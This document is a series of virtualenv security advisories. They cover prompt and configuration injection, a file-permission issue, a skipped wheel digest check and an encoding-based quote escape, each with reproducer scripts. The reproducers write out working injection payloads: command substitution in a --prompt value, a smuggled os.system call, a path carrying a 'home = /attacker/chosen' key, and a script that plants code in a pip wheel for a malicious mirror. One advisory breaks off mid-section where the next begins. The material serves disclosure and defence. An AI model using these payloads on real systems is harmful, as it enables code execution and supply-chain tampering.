## Summary  Caller-supplied prompt text can become executable syntax in the bash activation prompt. An attacker must influence the value passed to virtualenv, and a user must subsequently activate the environment and draw the prompt.  ## Affected area  Bash runs with compatibility level 4.2 and draws the environment prompt. Its replacement-string behavior differs from newer compatibility modes, leaving prompt text subject to a second interpretation. The report concerns POSIX activation. It does not establish exposure through unrelated activators.  ## Attacker-controlled input  The attacker controls prompt or destination data passed as a virtualenv argument. The user later sources the generated activation script.  ## Affected code  The relevant 21.14.8 source is in [bash prompt assembly](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/bash/activate.sh).  ## Mechanism  `bin/activate` copies the prompt into `PS1`. A shell expands `PS1` again when it draws a prompt, so the value must survive both the assignment and that later expansion. The bash and zsh branches escape for their usual prompt rules. Three other paths still interpret prompt data as commands: dash sourcing `activate` directly, a child dash inheriting an exported `PS1` from bash, and bash running at compatibility level 4.2 or lower. A value such as `x$(touch MARKER)y` then runs `touch` on prompt display. Creating the environment does not run the payload.  ## Reproduction and evidence  The scanner's child-shell reproducer creates an environment with `--prompt 'x$(touch MARKER)y'`, sources `bin/activate` in interactive bash, and starts interactive `sh` (dash). Its control leaves `PS1` unexported: neither shell creates `MARKER`. With `PS1` exported, bash displays the prompt without executing the value, but the child dash creates `MARKER`; the reproducer ends in `BUG`. The report gives separate console reproductions for direct dash activation and bash compatibility level 4.2. The child-shell path can arise after another environment's activation has exported `PS1`.  The scanner linked this finding to [#3326](https://github.com/pypa/virtualenv/pull/3326) and its follow-up #3390. Those changes cover the usual bash path but leave the three paths above. The proposed change in [#3418](https://github.com/pypa/virtualenv/pull/3418) keeps a variable reference in `PS1`, so prompt text is expanded as data when drawn. The private report's reproducer was run by the scanner; the later command-execution result was supplied by the maintainer review. This advisory does not claim that every POSIX shell or every bash mode is affected.  ## Introduced  The report traces direct dash sourcing to the first 20.x activator (20.0.0b1), and inherited `PS1` to #3390 (first released in 21.14.7). It demonstrates the compatibility-level case on bash 5.2. Those historical boundaries come from the report; the release confirmed by the maintainer is 21.14.8.  ## Attack sequence  ```mermaid sequenceDiagram     participant A as Prompt supplier     participant V as virtualenv     participant B as Interactive bash     participant D as Child dash     A->>V: --prompt x$(touch MARKER)y     V->>B: generated bin/activate     B->>B: assign escaped prompt to PS1     alt PS1 is not exported         B->>D: start sh with its own PS1         D-->>B: marker absent     else PS1 is exported         B->>D: start sh with inherited PS1         D->>D: expand $(touch MARKER) on prompt draw         D-->>B: marker created     end ```  ## Reproducer files  The following files are from the scanner report for `ANT-2026-1MOI2X3T`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.  **`repro`**  ```text #!/usr/bin/env python3 import shutil import subprocess from pathlib import Path  work = Path("/tmp/repro-inherited-ps1") shutil.rmtree(work, ignore_errors=True) work.mkdir() marker = work / "MARKER" print("sh is", Path("/bin/sh").resolve())  # attacker: only the text a tool such as tox or hatch relays as --prompt hostile_prompt = f"x$(touch {marker})y"  # set up: the environment, made with the virtualenv command subprocess.run(     ["virtualenv", "--no-periodic-update", "--without-pip", "--activators", "bash",      "--prompt", hostile_prompt, str(work / "env")],     check=True, stdout=subprocess.DEVNULL, ) assert not marker.exists(), "creating the environment must not run the prompt"  # user: in an interactive bash, source bin/activate, then start sh. # -i makes both shells draw their prompt although stdin is not a terminal; sh draws one, reads EOF and returns session = Path("/tmp/repro.d/user_session.sh").read_text() interactive_bash = ["bash", "--norc", "--noprofile", "-i"]  # control: PS1 set in bash but not exported, so sh does not inherit it control = subprocess.run(interactive_bash, input="PS1='\\$ '\n" + session,                          stderr=subprocess.PIPE, text=True, check=True) print(control.stderr) ran_in_control = marker.exists() print("CONTROL  PS1 not exported: marker created:", ran_in_control)  # attack: the same session with the one difference that PS1 is exported attack = subprocess.run(interactive_bash, input="export PS1='\\$ '\n" + session,                         stderr=subprocess.PIPE, text=True, check=True) print(attack.stderr) ran_in_attack = marker.exists() print("OBSERVED PS1 exported:     marker created:", ran_in_attack)  # check: the prompt text must be drawn, never run, by every shell that draws it print("BUG" if ran_in_attack and not ran_in_control else "OK") ```  **`repro.d/user_session.sh`**  ```text . /tmp/repro-inherited-ps1/env/bin/activate sh -i </dev/null ```  ## Impact  An affected activation can execute commands with the user's privileges. Severity is high, following the generated-script precedent in [GHSA-p58f-9548-mpm2](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2). The attack requires control of argument data and subsequent user activation; it does not require replacing an executable or controlling app-data contents.  ## Versions tested  The supplied follow-up review marks command execution as independently confirmed by its author. The implementation review used source inspection and patched literal-value checks, without rerunning that exploit. The relevant activation source is identical between release 21.14.8 and upstream/main 233359cb. The maintainer previously confirmed validation of the reported findings on 21.14.8. The first affected version has not been established. Fixed in 21.14.9.  ## Known mitigation  Use trusted prompt and destination values. On older releases, disable the environment prompt with VIRTUAL_ENV_DISABLE_PROMPT=1. Recreate environments with virtualenv 21.14.9 or later.  ## Affected release  - [x] The problem reproduces on virtualenv 21.14.8.  ## Credits  The original report was supplied by Anthropic's OSS Scanner as ANT-2026-1MOI2X3T. The subsequent maintainer-provided review identified the remaining activation path.

## Summary  The venv creator reads the standard library's generated pyvenv.cfg with splitlines() and merges all resulting keys over virtualenv's configuration. Line-boundary characters from destination data can therefore become configuration structure before output sanitization.  Anthropic's OSS Scanner reported this as `ANT-2026-6ZQHJ6VI` in `virtualenv-20261015-005`, received on 15 October 2026.  ## Affected area  Configuration readback by the stdlib venv creator.  ## Attacker-controlled input  An untrusted caller must influence the destination pathname passed to the venv creator. That pathname must contain a character that Python treats as a line boundary. The builtin creator follows a different configuration-writing path.  ## Affected code  The relevant 21.14.8 source is in [venv readback](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/via_global_ref/venv.py), [configuration parser](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/pyenv_cfg.py).  ## Mechanism  With `--creator venv`, virtualenv asks the standard library to create an environment, reads its `pyvenv.cfg` with `str.splitlines()`, and merges the parsed keys over virtualenv's chosen settings. CPython writes the destination into a `command =` value without escaping every character that `splitlines()` recognizes as a line boundary. A destination containing U+2028, for example, can therefore supply new `home` and `include-system-site-packages` keys during readback. Virtualenv writes those keys as real configuration lines. The builtin creator does not use this readback path.  ## Reproduction and evidence  The scanner used one destination value with U+2028 between `home = /attacker/chosen`, `include-system-site-packages = true`, and an absorbing `x =` key. A `python -m venv --without-pip` control kept the value inside its `command` line and reported the base interpreter's `sys._home`. `virtualenv --creator venv --no-seed` on the same value wrote separate injected configuration lines and its interpreter reported `sys._home = /attacker/chosen`. The path did not require a literal newline byte. The control establishes that the extra keys came from virtualenv's readback, not from the standard library's initial file alone.  The altered `home` can change which standard-library files the interpreter loads if an attacker also controls that location; `include-system-site-packages = true` weakens environment isolation. Choosing the venv creator is required, either explicitly or through a rare fallback. The report traces the readback to the 20.x rewrite, first released in 20.0.0b1. [PR #3426](https://github.com/pypa/virtualenv/pull/3426) rejects line-boundary characters before creation and rebuilds the final configuration from selected settings.  ## Attack sequence  ```mermaid sequenceDiagram     participant A as Destination supplier     participant S as stdlib venv     participant V as virtualenv readback     participant C as Final pyvenv.cfg     participant P as Environment Python     A->>S: path contains U+2028 and home = /attacker/chosen     S->>C: write path inside command value     V->>C: read with splitlines()     V->>V: parse suffix as separate keys     V->>C: rewrite home and include-system-site-packages     P->>C: read injected keys on startup     C-->>P: sys._home changes and isolation is disabled ```  ## Reproducer files  The following files are from the scanner report for `ANT-2026-6ZQHJ6VI`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.  **`repro`**  ```text #!/usr/bin/env python3 import os import shutil import subprocess  work = "/tmp/repro-venv-creator-cfg" shutil.rmtree(work, ignore_errors=True)  # the attacker's input: the text of a destination path. # U+2028 ends a line for str.splitlines() but not for CPython's own pyvenv.cfg reader. # The slashes only make nested directories; the last key, x, absorbs the rest of the path. LS = "\u2028" dest = f"{work}/proj{LS}home = /attacker/chosen{LS}include-system-site-packages = true{LS}x = /env"  base_python = os.path.realpath(shutil.which("python")) real_home = os.path.dirname(base_python)   def pyvenv_cfg_lines(env):     # split on "\n" only, as the interpreter does     return open(f"{env}/pyvenv.cfg", encoding="utf-8").read().split("\n")   def sys_home(env):     # site.py sets sys._home from the `home` key of the environment's pyvenv.cfg     probe = [f"{env}/bin/python", "-c", "import sys; print(sys._home)"]     return subprocess.run(probe, capture_output=True, text=True, check=True).stdout.strip()   # control: the same path through the standard library alone stdlib_env = dest + "-stdlib" subprocess.run([base_python, "-m", "venv", "--without-pip", stdlib_env], check=True)  # attack: the same path through virtualenv; --creator venv is the one non-default option virtualenv_env = dest + "-virtualenv" created = subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", "--no-seed", "--creator", "venv", virtualenv_env]) if created.returncode != 0:  # refusing such a destination is a valid fix     print("virtualenv refused the destination")     print("OK")     raise SystemExit  # check stdlib_cfg, stdlib_home = pyvenv_cfg_lines(stdlib_env), sys_home(stdlib_env) virtualenv_cfg, virtualenv_home = pyvenv_cfg_lines(virtualenv_env), sys_home(virtualenv_env)  print("CONTROL  python -m venv wrote pyvenv.cfg:") for line in stdlib_cfg:     print("    " + ascii(line)) print(f"CONTROL  python -m venv: sys._home = {stdlib_home}") print("OBSERVED virtualenv --creator venv wrote pyvenv.cfg:") for line in virtualenv_cfg:     print("    " + ascii(line)) print(f"OBSERVED virtualenv --creator venv: sys._home = {virtualenv_home}")  keys_injected = "home = /attacker/chosen" in virtualenv_cfg and "include-system-site-packages = true" in virtualenv_cfg print("BUG" if stdlib_home == real_home and keys_injected and virtualenv_home == "/attacker/chosen" else "OK") ```  ## Impact  Destination path data can change configuration boundaries and therefore environment settings. The effect depends on which settings change and how the environment is subsequently used.  Severity: low.  ## Versions tested  The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9.  The fix rejects line boundaries in the supplied destination before filesystem access and checks the resolved path again before invoking stdlib venv. The final configuration is rebuilt from the selected interpreter and virtualenv options, without merging the intermediate stdlib file or its vendor-specific keys. Ordinary destination paths remain supported.  Fix: [PR #3426](https://github.com/pypa/virtualenv/pull/3426).  ## Known mitigation  Reject line-boundary characters in externally supplied destination paths, or use the builtin creator where supported.  ## Affected release  - [x] The problem reproduces on virtualenv 21.14.8.  ## Credits  Reported by Anthropic's OSS Scanner as ANT-2026-6ZQHJ6VI.

## Summary  The app-data copy seeder uses shutil.copy, which preserves cached file modes independently of the current umask. A cache populated under permissive permissions can therefore produce files with wider access in later environments.  Anthropic's OSS Scanner reported this as `ANT-2026-487MH6OW` in `virtualenv-20261015-005`, received on 15 October 2026.  ## Affected area  Permissions of files copied from app-data into a new environment.  ## Attacker-controlled input  The cache must contain files created with broader permissions than the current environment creator intends. Another account must also be able to traverse the new environment and reach those files. A private parent directory prevents that access. No control of a private live cache is assumed.  ## Affected code  The relevant 21.14.8 source is in [copy helpers](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).  ## Mechanism  The default app-data seeder extracts a wheel into a reusable cache and copies its files into later environments with `shutil.copy()`. That function applies the cached source mode to each destination file after creating it, overriding the current run's umask. If the cache image was built under umask `000`, a later environment created under umask `022` can receive mode-`0666` pip files. The cache may be private while the new environment is reachable by other local accounts.  ## Reproduction and evidence  The scanner created two histories with separate private app-data caches. In the control, the owner's first run used umask `022`; a later environment had no files writable by another account, and that account could not append to `pip/__init__.py`. In the attack history, the first run used umask `000` and the later run still used `022`. The report counted 478 of 493 environment files writable by others. A second unprivileged uid appended a line to pip, and `bin/pip --version` ran it as the environment owner. The cache itself remained under a mode-`0700` home in both histories.  An attacker cannot force the owner's earlier umask through this finding; the attack also needs a traversable destination. A mode-`002` cache can expose group write access under suitable group permissions. The scanner dates app-data copy seeding to #1578, first released in 20.0.2. [PR #3425](https://github.com/pypa/virtualenv/pull/3425) creates copied files under a fixed non-writable-by-others policy further restricted by the current umask.  ## Attack sequence  ```mermaid sequenceDiagram     participant U as Environment owner     participant C as Private app-data cache     participant E as Later environment     participant A as Other local account     U->>C: first seed extraction under umask 000     C-->>U: cached pip files have mode 0666     U->>E: create environment under umask 022     C->>E: shutil.copy reapplies mode 0666     A->>E: append code to pip/__init__.py     U->>E: run bin/pip --version     E-->>U: appended code runs as owner ```  ## Reproducer files  The following files are from the scanner report for `ANT-2026-487MH6OW`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. ## Summary The pip seeder acquires bundled wheels with download=False and lets pip access the index when --download is selected. Index candidates on that path do not pass through virtualenv's wheel digest verification. Anthropic's OSS Scanner reported this as `ANT-2026-74ALJBUF` in `virtualenv-20261015-005`, received on 15 October 2026. ## Affected area Wheel selection by the pip seeder when downloads are enabled. ## Attacker-controlled input The pip seeder and download option must be selected. The finding concerns the default-index digest-verification policy. Explicit custom-index settings already opt out of comparison against PyPI metadata; this patch retains that policy. ## Affected code The relevant 21.14.8 source is in [pip seeder](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/pip_invoke.py). ## Mechanism With `--seeder pip --download`, `PipInvoke.get_pip_install_cmd()` first calls `get_wheel(download=False)`, so virtualenv's `download_wheel()` and `verify_wheel_digest()` are skipped. It then lets `pip install` consult the configured index. An index wheel with the same package and version as the bundled wheel can be selected without virtualenv comparing its SHA-256 with PyPI metadata. The default app-data seeder takes the verification path for the same option. ## Reproduction and evidence The scanner built a local index named in `pip.conf` that served a modified copy of the bundled pip wheel under the same filename. In the control run, `virtualenv --download env-default` rejected the wheel with a digest mismatch. In the second run, adding `--seeder pip` produced an environment whose installed `pip/__init__.py` matched the index wheel; `env-pip/bin/pip --version` ran the added line. The reproducer checked the installed bytes and marker before reporting `BUG`. Both `--seeder pip` and `--download` are needed. The report used a non-PyPI index from `pip.conf` and left `PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, and `PIP_INDEX` unset, so virtualenv's default-seeder PyPI comparison remained active. This does not establish index control in the default PyPI setup. The unchecked pip-seeder download path is older, while the comparison with the default seeder arose when digest verification was added in 21.7.12. [PR #3430](https://github.com/pypa/virtualenv/pull/3430) acquires and verifies selected wheels before invoking pip with index lookup disabled. ## Attack sequence ```mermaid sequenceDiagram participant I as Index in pip.conf participant V as virtualenv PipInvoke participant P as pip install participant E as Seeded environment I->>V: serve modified pip wheel V->>V: get_wheel(download=False) V->>P: install with --download permitting index lookup P->>I: select same-version index wheel I->>E: modified pip installed without virtualenv digest check E->>E: later pip invocation runs added code Note over V,E: Default app-data seeder rejects the same digest ``` ## Reproducer files The following files are from the scanner report for `ANT-2026-74ALJBUF`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update. **`repro`** ```text #!/usr/bin/env python3 import glob import hashlib import json import os import shutil import subprocess import sys import zipfile from virtualenv.seed.wheels.embed import get_embed_wheel companions = "/tmp/repro.d" work = "/tmp/repro-pip-seeder-download" shutil.rmtree(work, ignore_errors=True) os.makedirs(work) # set up: the pip wheel virtualenv bundles, and PyPI's record of its sha256 (served by virtualenv_offline.py: no network) bundled = get_embed_wheel("pip", f"{sys.version_info.major}.{sys.version_info.minor}") pypi_sha256 = hashlib.sha256(open(bundled.path, "rb").read()).hexdigest() pypi_release = {"filename": bundled.name, "digests": {"sha256": pypi_sha256}} os.makedirs(f"{work}/pypi.org/pypi/pip") with open(f"{work}/pypi.org/pypi/pip/json", "w") as pypi_json: json.dump({"releases": {bundled.version: [pypi_release]}}, pypi_json) # attacker: the mirror serves other bytes under the bundled wheel's own file name marker = f"{work}/MIRROR_CODE_RAN" subprocess.run([sys.executable, f"{companions}/make_mirror.py", str(bundled.path), f"{work}/mirror", marker], check=True) mirror_wheel = f"{work}/mirror/pip/{bundled.name}" mirror_sha256 = hashlib.sha256(open(mirror_wheel, "rb").read()).hexdigest() print(f"{bundled.name}: PyPI publishes sha256 {pypi_sha256}") print(f"{bundled.name}: the mirror serves sha256 {mirror_sha256}") # user: pip.conf names the mirror; PIP_INDEX_URL, PIP_EXTRA_INDEX_URL and PIP_INDEX (which turn the check off) are unset with open(f"{work}/pip.conf", "w") as pip_conf: pip_conf.write(f"[global] index-url = file://{work}/mirror ") # file:// stands in for the mirror's http URL os.makedirs(f"{work}/home-default") os.makedirs(f"{work}/home-pip") # one HOME per run, so neither sees the other's app-data or pip cache virtualenv = [sys.executable, f"{companions}/virtualenv_offline.py", f"{work}/pypi.org", "--no-periodic-update"] # control: the default seeder with --download fetches the mirror's wheel and refuses it default_seeder = subprocess.run( [*virtualenv, "--download", f"{work}/env-default"], env={**os.environ, "HOME": f"{work}/home-default", "PIP_CONFIG_FILE": f"{work}/pip.conf"}, capture_output=True, text=True, ) refusal = [line for line in default_seeder.stdout.splitlines() if line.startswith("RuntimeError: ")] print(f" CONTROL virtualenv --download env-default: exit {default_seeder.returncode}") print(" ".join(refusal)) # check: compare env-pip's pip/__init__.py with the one in each wheel with zipfile.ZipFile(bundled.path) as wheel: bundled_init = wheel.read("pip/__init__.py") with zipfile.ZipFile(mirror_wheel) as wheel: mirror_init = wheel.read("pip/__init__.py") installed = glob.glob(f"{work}/env-pip/lib/python*/site-packages/pip/__init__.py") installed_init = open(installed[0], "rb").read() if installed else b"" refusal_message = f"has sha256 {mirror_sha256}, but PyPI reports {pypi_sha256}" refused = default_seeder.returncode != 0 and refusal_message in default_seeder.stdout print(f"default seeder refused the mirror's wheel for its digest: {refused}") print(f"env-pip's pip/__init__.py is the bundled wheel's: {installed_init == bundled_init}, the mirror's: {installed_init == mirror_init}") print(f"the mirror's line ran on env-pip/bin/pip --version: {os.path.exists(marker)}") print("BUG" if refused and installed_init == mirror_init and os.path.exists(marker) else "OK") ``` **`repro.d/make_mirror.py`** ```text #!/usr/bin/env python3 # usage: make_mirror.py import os import sys import zipfile genuine_wheel, mirror, marker = sys.argv[1:] wheel_name = os.path.basename(genuine_wheel) payload = f" open({marker!r}, 'w').write('mirror code ran') " os.makedirs(f"{mirror}/pip") with zipfile.ZipFile(genuine_wheel) as genuine, zipfile.ZipFile(f"{mirror}/pip/{wheel_name}", "w") as served: for entry in genuine.infolist(): data = genuine.read(entry) if entry.filename == "pip/__init__.py": data += payload.encode() served.writestr(entry, data) # PEP 503 project page; pip reads /pip/index.html for a file:// index with open(f"{mirror}/pip/index.html", "w") as page: page.write(f'{wheel_name} ') ``` **`repro.d/virtualenv_offline.py`** ```text #!/usr/bin/env python3 # usage: virtualenv_offline.py # The `virtualenv` command, except that the PyPI JSON API request (the source of the digest the default seeder # checks) is answered from a local file, as tests/unit/seed/wheels/test_periodic_update.py does. pip is not touched. import sys from virtualenv.__main__ import run_with_catch from virtualenv.seed.wheels import periodic_update pypi_org = sys.argv[1] def pypi_json_api(url, context=None): return open(url.replace("https://pypi.org", pypi_org), "rb") periodic_update.urlopen = pypi_json_api run_with_catch(sys.argv[2:]) ``` ## Impact The default-index digest-verification step can be omitted when the pip seeder downloads packages. This does not by itself defeat TLS or establish control of an index response. Severity: low. ## Versions tested The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9. The fix acquires wheels through the shared verification path and installs pinned names with index lookup disabled. A private temporary directory contains only the selected archives. This preserves version pins in pip freeze output. Fix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430). ## Known mitigation On older releases, use embedded wheels without downloads, or acquire and verify approved seed archives separately. ## Affected release - [x] The problem reproduces on virtualenv 21.14.8. ## Credits Reported by Anthropic's OSS Scanner as ANT-2026-74ALJBUF.

## Summary  Caller-supplied prompt text can become executable syntax in the xonsh activation script. An attacker must influence the value passed to virtualenv, and a user must subsequently activate the environment.  ## Affected area  Xonsh reads a UTF-8 activation script using a legacy multibyte encoding such as GBK. Printable non-ASCII bytes can change how the reader recognizes an adjacent quote. The report concerns POSIX activation. It does not establish exposure through unrelated activators.  ## Attacker-controlled input  The attacker controls prompt or destination data passed as a virtualenv argument. The user later sources the generated activation script.  ## Affected code  The relevant 21.14.8 source is in [xonsh quote()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/xonsh/__init__.py), [UTF-8 template writer](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/via_template.py).  ## Mechanism  The generator writes `activate.xsh` as UTF-8. Its `quote()` used `repr()`, which leaves printable non-ASCII characters in the file and backslash-escapes an embedded quote. Xonsh's `source` reads the file using `$XONSH_ENCODING`. With GBK or Big5, the UTF-8 bytes of `中` end in `0xad`, which pairs with the following `0x5c` backslash as one decoded character. The backslash no longer escapes the quote. A prompt containing both quote kinds can then close its Python string literal and supply statements that run during activation. With UTF-8 source decoding, the same value stays inside the literal.  ## Reproduction and evidence  The original scanner finding, `ANT-2026-PAUVP7YL`, demonstrated this byte-level failure in `activate_this.py`: a hostile prompt loaded through `exec(open(file).read(), ...)` under GBK created a marker, while UTF-8 and `runpy.run_path` controls did not. The xonsh path in this advisory was identified in the subsequent maintainer-provided review. [PR #3432](https://github.com/pypa/virtualenv/pull/3432) shows the xonsh source-decoding chain and changes `quote()` to `ascii()`, which writes non-ASCII characters as escapes. Its regression test encodes the generated literal as ASCII, decodes it as GBK, and checks that `ast.literal_eval` returns the original prompt.  The attack needs control of the prompt or destination value, an affected xonsh source encoding, and later sourcing of the generated file. The original `activate_this.py` reproducer does not itself prove xonsh execution; that result is attributed to the separate review. Existing `activate.xsh` files must be regenerated after the fix.  ## Attack sequence  ```mermaid sequenceDiagram     participant A as Prompt supplier     participant V as virtualenv quote()     participant F as activate.xsh bytes     participant X as xonsh source     A->>V: 中 plus escaped quote and statements     V->>F: repr writes UTF-8 中 followed by backslash     alt XONSH_ENCODING is UTF-8         F->>X: backslash remains an escape         X-->>A: prompt remains data     else XONSH_ENCODING is GBK or Big5         F->>X: decoder consumes backslash as trail byte         X->>X: quote closes and statements run     end     Note over V,X: ascii() emits only ASCII bytes and preserves the literal ```  ## Reproducer files  The following files are from the scanner report for `ANT-2026-PAUVP7YL`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.  **`repro`**  ```text #!/usr/bin/env python3 import os import subprocess import sys from pathlib import Path from shutil import rmtree  work = Path("/tmp/activate-this-gbk") rmtree(work, ignore_errors=True) work.mkdir() env_dir = work / "venv" marker = work / "MARKER"  # set up: a zh_CN.GBK locale, which the image does not ship subprocess.run([sys.executable, "/tmp/repro.d/install_gbk_locale.py", work / "locales"], check=True) utf8_session = {"PATH": os.environ["PATH"], "LANG": "C.UTF-8"} gbk_session = {"PATH": os.environ["PATH"], "LANG": "zh_CN.GBK", "LOCPATH": str(work / "locales")}  # attacker: text that a tool relays as --prompt # the payload's " makes repr() delimit with ' and write the prompt's own ' as \' # 中 is e4 b8 ad in UTF-8; GBK reads e4 b8 as one character and ad 5c, ad plus that backslash, as the next payload = f'__import__("os").system("touch {marker}")' hostile_prompt = "中" + "';" + payload + "#"  # user: creates the environment with the virtualenv command subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", "--prompt", hostile_prompt, env_dir], check=True) activate_this = (env_dir / "bin" / "activate_this.py").read_bytes() prompt_line = next(line for line in activate_this.splitlines() if line.startswith(b'os.environ["VIRTUAL_ENV_PROMPT"]')) print(f"activate_this.py read as UTF-8: {prompt_line.decode('utf-8')}") print(f"activate_this.py read as GBK:   {prompt_line.decode('gbk')}") assert not marker.exists(), "payload ran at creation time"  # trigger: the same program activates the environment, first in a UTF-8 session, then in a GBK one activate = [sys.executable, "/tmp/repro.d/activate_with_exec_open.py", env_dir] control = subprocess.run(activate, env=utf8_session, stdout=subprocess.PIPE, encoding="utf-8", check=True) ran_in_utf8_session = marker.exists() print(f"CONTROL  UTF-8 session: {control.stdout.strip()}; {marker} exists: {ran_in_utf8_session}")  observed = subprocess.run(activate, env=gbk_session, stdout=subprocess.PIPE, encoding="gbk", check=True) ran_in_gbk_session = marker.exists() print(f"OBSERVED GBK session:   {observed.stdout.strip()}; {marker} exists: {ran_in_gbk_session}")  # check: the prompt is data and must not run in either session print("BUG" if ran_in_gbk_session and not ran_in_utf8_session else "OK") ```  **`repro.d/activate_with_exec_open.py`**  ```text #!/usr/bin/env python3 # usage: activate_with_exec_open.py ENV_DIR # A program that activates a virtualenv the way activate_this.py's docstring said to until virtualenv 20.26.2. import locale import os import sys  this_file = os.path.join(sys.argv[1], "bin", "activate_this.py") exec(open(this_file).read(), {"__file__": this_file})  print(f"open() decodes as {locale.getpreferredencoding(False)}, VIRTUAL_ENV_PROMPT is {os.environ['VIRTUAL_ENV_PROMPT']}") ```  **`repro.d/install_gbk_locale.py`**  ```text #!/usr/bin/env python3 # usage: install_gbk_locale.py LOCPATH # Does what `locale-gen zh_CN.GBK` would; localedef fills in defaults, warns and exits 1, so check the result below source = "/tmp/repro.d/zh_CN_minimal.locale" subprocess.run(["localedef", "-c", "-f", f"{locpath}/GBK.charmap", "-i", source, f"{locpath}/zh_CN.GBK"], capture_output=True)  gbk_session = {"PATH": os.environ["PATH"], "LANG": "zh_CN.GBK", "LOCPATH": locpath} codeset = subprocess.run(["locale", "charmap"], env=gbk_session, capture_output=True, text=True, check=True) if codeset.stdout.strip() != "GBK" or codeset.stderr:     sys.exit(f"zh_CN.GBK locale not usable: {codeset}") ```  **`repro.d/zh_CN_minimal.locale`**  ```text comment_char % escape_char / % Stand-in for glibc's locales/zh_CN: ASCII character classes only. What matters is the codeset name, GBK, which % comes from the charmap given to localedef with -f. LC_CTYPE upper <U0041>..<U005A> lower <U0061>..<U007A> digit <U0030>..<U0039> space <U0009>..<U000D>;<U0020> cntrl <U0000>..<U001F>;<U007F> punct <U0021>..<U002F>;<U003A>..<U0040>;<U005B>..<U0060>;<U007B>..<U007E> xdigit <U0030>..<U0039>;<U0041>..<U0046>;<U0061>..<U0066> blank <U0009>;<U0020> END LC_CTYPE LC_COLLATE order_start forward UNDEFINED order_end END LC_COLLATE ```  ## Impact  An affected activation can execute commands with the user's privileges. Severity is high, following the generated-script precedent in [GHSA-p58f-9548-mpm2](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2). The attack requires control of argument data and subsequent user activation; it does not require replacing an executable or controlling app-data contents.  ## Versions tested  The supplied follow-up review marks command execution as independently confirmed by its author. The implementation review used source inspection and patched literal-value checks, without rerunning that exploit. The relevant activation source is identical between release 21.14.8 and upstream/main 233359cb. The maintainer previously confirmed validation of the reported findings on 21.14.8. The first affected version has not been established. Fixed in 21.14.9.  ## Known mitigation  Use trusted prompt and destination values. Use UTF-8 source decoding in xonsh on older releases. Recreate environments with virtualenv 21.14.9 or later.  ## Affected release  - [x] The problem reproduces on virtualenv 21.14.8.  ## Credits  The original report was supplied by Anthropic's OSS Scanner as ANT-2026-PAUVP7YL. The subsequent maintainer-provided review identified the remaining activation path.  ## Additional fix branch  [PR #3411](https://github.com/pypa/virtualenv/pull/3411) also uses ASCII-only literals for paths and prompts, alongside its activation-state changes. Both branches must retain this quoting rule when integrated.
